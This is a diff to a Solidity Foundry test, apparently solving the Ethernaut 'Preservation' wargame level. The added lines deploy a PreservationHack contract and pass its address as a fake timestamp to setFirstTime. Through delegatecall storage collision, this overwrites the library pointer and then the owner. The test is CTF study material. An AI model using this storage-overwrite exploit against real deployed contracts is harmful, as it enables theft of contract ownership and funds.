@@ -46,11 +46,11 @@ contract PreservationTest is Test {
         // Parse emitted logs
         Vm.Log[] memory entries = vm.getRecordedLogs();
         assertEq(
-            entries[2].topics[0],
+            entries[0].topics[0],
             keccak256("LevelInstanceCreatedLog(address,address,address)")
             // event LevelInstanceCreatedLog(address indexed player, address indexed instance, address indexed level);
         );
-        Vm.Log memory levelPreservationCreatedLog = entries[2];
+        Vm.Log memory levelPreservationCreatedLog = entries[0];
 
         // Cast bytes32 log arg into address
         address instanceAddress = address(
@@ -65,6 +65,22 @@ contract PreservationTest is Test {
         address owner = instance.owner();
         emit log_named_address("owner", owner);
         assertEq(owner, address(preservationFactory));
+
+        PreservationHack preservationHack = new PreservationHack();
+        emit log_named_address("preservationHack", address(preservationHack));
+
+        // the lower order 20 bytes will be address of preservationHack
+        // which will be overwritten on the Preservation.timeZone1Library()
+        uint256 timestamp = uint256(uint160(address(preservationHack)));
+        instance.setFirstTime(timestamp);
+
+        address timeZone1Library = instance.timeZone1Library();
+        emit log_named_address("timeZone1Library", timeZone1Library);
+        assertEq(timeZone1Library, address(preservationHack));
+
+        // Now call it again which will call into PreservationHack that overwrites Preservation's storage layout
+        // And update owner
+        instance.setFirstTime(timestamp);
 
         owner = instance.owner();
         emit log_named_address("owner", owner);
